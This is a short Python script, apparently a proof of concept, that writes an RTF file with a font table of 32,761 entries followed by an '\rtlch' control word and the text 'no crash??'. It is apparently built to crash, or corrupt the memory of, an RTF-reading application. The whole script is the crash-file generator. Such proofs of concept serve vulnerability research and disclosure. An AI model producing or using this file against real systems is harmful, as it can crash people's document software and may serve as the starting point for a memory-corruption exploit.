#!/usr/bin/python3

file = input("please enter full path of output file\n>")
if file == "":
	file = "out.rtf"
with open(file,"wb") as f:
	data  = "{\\rtf1{\n{\\fonttbl"
	data += "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ])
	data += "}\n{\\rtlch no crash??}\n}}\n"
	f.write(data.encode('utf-8'))
print("Done.")
